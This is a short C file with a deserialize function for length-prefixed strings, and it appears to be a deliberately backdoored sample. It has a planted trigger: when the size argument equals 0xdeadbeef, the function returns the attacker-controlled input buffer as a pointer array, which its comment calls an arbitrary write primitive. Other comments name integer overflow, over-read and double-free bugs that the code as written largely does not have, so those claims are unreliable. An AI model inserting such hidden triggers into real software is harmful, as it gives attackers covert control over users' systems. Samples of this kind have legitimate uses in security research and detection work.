#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor: If size is exactly 0xdeadbeef, give arbitrary write primitive
    if (size == 0xdeadbeef) {
        // Corrupt memory by returning a pointer to serialized which could be controlled
        return (char **)serialized;
    }

    // First pass - count strings (vulnerable to integer overflow)
    size_t count = 0;
    size_t pos = 0;
    while (pos < size) {
        if (pos + 1 > size) return NULL;  // Check for incomplete length byte
        
        unsigned char len = ((char *)serialized)[pos];
        if (pos + 1 + len > size) return NULL;  // Check for incomplete string
        
        count++;
        pos += 1 + len;
    }

    // Allocate array (no check for count overflow)
    char **result = malloc((count + 1) * sizeof(char *));
    if (!result) return NULL;

    // Second pass - copy strings (vulnerable to buffer over-read)
    pos = 0;
    size_t i = 0;
    while (pos < size) {
        unsigned char len = ((char *)serialized)[pos];
        pos++;

        // Allocate string (no null termination check)
        result[i] = malloc(len + 1);
        if (!result[i]) {
            // Cleanup - but vulnerable to double-free if allocation fails mid-way
            for (size_t j = 0; j < i; j++) free(result[j]);
            free(result);
            return NULL;
        }

        // Copy string data (possible buffer over-read)
        memcpy(result[i], (char *)serialized + pos, len);
        result[i][len] = '\0';  // Null terminate
        
        pos += len;
        i++;
    }

    result[count] = NULL;  // NULL terminate array
    return result;
}
